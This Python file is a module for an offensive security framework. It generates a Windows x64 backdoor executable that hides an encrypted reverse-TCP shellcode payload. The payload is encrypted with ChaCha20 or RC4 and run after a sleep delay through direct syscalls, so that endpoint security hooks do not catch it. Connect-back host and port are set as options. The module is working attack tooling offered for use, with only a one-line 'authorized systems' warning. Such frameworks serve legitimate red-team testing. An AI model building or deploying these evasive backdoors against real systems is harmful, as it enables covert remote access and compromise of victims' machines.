#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Direct Windows syscall evasion loader.

Port of Metasploit's direct syscall evasion technique: resolves Zw* stubs from
ntdll at runtime, invokes direct syscalls to allocate/write/execute shellcode,
and encrypts the embedded payload (ChaCha20 or RC4).

Compiled with the framework Zig toolchain (cross-compiles C + inline asm to PE).
"""

from kittysploit import *
from lib.compile.backdoor_helpers import (
    compile_c_pe,
    generate_payload_bytes,
    option_value,
    prepare_exe_output,
    report_payload_size,
)
from lib.compile.syscall_evasion import SyscallEvasionBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Direct Windows Syscall Evasion",
        "description": (
            "Generate a Windows x64 EXE that evades userland hooks by calling direct "
            "syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.). "
            "Shellcode is encrypted (ChaCha20 or RC4) and base64-encoded. "
            "Prefer HTTPS/RC4 payloads and high SLEEP values for better evasion."
        ),
        "author": ["Yaz (kensh1ro)", "KittySploit"],
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://github.com/rapid7/metasploit-framework",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(20000, "Sleep time in milliseconds before executing shellcode", False)
    output_name = OptString("syscall_evasion.exe", "Output executable filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the EXE", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        raw_payload = generate_payload_bytes(self)
        if not raw_payload:
            return False

        report_payload_size(raw_payload)

        builder = SyscallEvasionBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        encoded, key, iv = builder.encrypt_payload(raw_payload)
        source = builder.build_source(encoded, key, iv)

        out_dir, exe_name = prepare_exe_output(
            self,
            "backdoors/windows/evasion",
            str(option_value(self, "output_name") or "syscall_evasion.exe"),
        )
        exe_path = out_dir / exe_name

        if option_value(self, "save_source"):
            src_path = out_dir / "main.c"
            src_path.write_text(source, encoding="utf-8")
            print_success(f"C source saved: {src_path}")

        ok = compile_c_pe(
            source=source,
            exe_path=exe_path,
            headers_dir=str(SyscallEvasionBuilder.headers_directory()),
            framework=getattr(self, "framework", None),
            optimization=str(option_value(self, "optimization") or "ReleaseSmall"),
        )

        if ok and exe_path.is_file():
            size = exe_path.stat().st_size
            print_success(f"Backdoor executable generated: {exe_path} ({size} bytes)")
            print_info(
                f"Cipher: {option_value(self, 'cipher')} | "
                f"Sleep: {option_value(self, 'sleep')} ms | "
                f"Syscall seed: 0x{builder.seed:x}"
            )
            print_warning("Use only on authorized systems. Start a matching listener before running the EXE.")
            return True

        print_error("PE compilation failed. Ensure Zig is installed (core/lib/compiler/zig_executable or PATH).")
        return False
